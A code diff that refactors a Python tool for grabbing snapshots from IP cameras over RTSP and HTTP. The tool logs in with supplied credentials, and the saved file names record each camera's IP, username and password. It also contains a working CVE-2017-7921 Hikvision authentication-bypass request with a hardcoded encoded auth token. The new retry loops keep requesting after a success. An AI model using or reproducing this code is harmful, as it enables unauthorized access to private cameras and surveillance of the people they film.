@@ -1,5 +1,6 @@
 """Some tools about camera"""
 import os
+import sys
 import requests
 import argparse
 from functools import partial
@@ -7,7 +8,10 @@ from functools import partial
 import rtsp
 from PIL import Image
 
-from base import multi_thread
+CWD = os.path.dirname(__file__)
+sys.path.append(os.path.join(CWD, '..'))
+from utils.base import multi_thread
+from utils.config import TIMEOUT, MAX_RETRIES
 
 
 def get_parser():
@@ -53,32 +57,18 @@ def snapshot_switch(camera_info, snapshot_path):
                 snapshot_rtsp(*camera_info[:4], snapshot_path)
             # Hikvision multiplay / HB-Teck
             if camera_info[4] == 'HB-Tech/Hikvision':
-                snapshot_rtsp_hb(*camera_info[:4], snapshot_path)
+                snapshot_rtsp(*camera_info[:4], snapshot_path, multiplay=True)
             if camera_info[4] == 'DLink':
                 snapshot_dlink(*camera_info[:4], snapshot_path)
     except Exception as e:
         pass
 
 
-def snapshot_rtsp(ip, port, user, passwd, sv_path):
+def snapshot_rtsp(ip, port, user, passwd, sv_path, multiplay=False):
     """get snapshot through rtsp"""
-    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554", verbose=False) as client:
-        while client.isOpened():
-            img_bgr = client.read(raw=True)
-            if not img_bgr is None:
-                img_rgb = img_bgr.copy()
-                img_rgb[:,:,0] = img_bgr[:,:,2]
-                img_rgb[:,:,1] = img_bgr[:,:,1]
-                img_rgb[:,:,2] = img_bgr[:,:,0]
-                name = f"{ip}:{port}-{user}-{passwd}.jpg"
-                img = Image.fromarray(img_rgb)
-                img.save(os.path.join(sv_path, name))
-                break
-
-
-def snapshot_rtsp_hb(ip, port, user, passwd, sv_path):
-    """get hb-tech/hikvision snapshot through rtsp (multiplay, get channel 0)"""
-    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream", verbose=False) as client:
+    if not multiplay: url = f"rtsp://{user}:{passwd}@{ip}:554"
+    else: url = f"rtsp://{user}:{passwd}@{ip}:554/h264/ch0/main/av_stream"
+    with rtsp.Client(rtsp_server_uri=url, verbose=False) as client:
         while client.isOpened():
             img_bgr = client.read(raw=True)
             if not img_bgr is None:
@@ -93,21 +83,21 @@ def snapshot_rtsp_hb(ip, port, user, passwd, sv_path):
 
 
 def snapshot_dlink(ip, port, user, passwd, sv_path):
-    r = requests.get(f"http://{ip}:{port}/dms?nowprofileid=1", auth=(user, passwd), timeout=3)
-    if r.status_code == 200:
-        name = f"{ip}:{port}-{user}-{passwd}.jpg"
-        with open(os.path.join(sv_path, name), 'wb') as f:
-            f.write(r.content)
-    else: snapshot_dlink(ip, port, user, passwd, sv_path)
+    for _ in range(MAX_RETRIES):
+        r = requests.get(f"http://{ip}:{port}/dms?nowprofileid=1", auth=(user, passwd), timeout=TIMEOUT)
+        if r.status_code == 200:
+            name = f"{ip}:{port}-{user}-{passwd}.jpg"
+            with open(os.path.join(sv_path, name), 'wb') as f:
+                f.write(r.content)
     
 
 def snapshot_cve_2017_7921(ip, port, sv_path):
-    r = requests.get(f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=3)
-    if r.status_code == 200:
-        name = f"{ip}:{port}-cve_2017_7921.jpg"
-        with open(os.path.join(sv_path, name), 'wb') as f:
-            f.write(r.content)
-    else: snapshot_cve_2017_7921(ip, sv_path)
+    for _ in range(MAX_RETRIES):
+        r = requests.get(f"http://{ip}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK", timeout=TIMEOUT)
+        if r.status_code == 200:
+            name = f"{ip}:{port}-cve_2017_7921.jpg"
+            with open(os.path.join(sv_path, name), 'wb') as f:
+                f.write(r.content)
 
 
 if __name__ == '__main__':
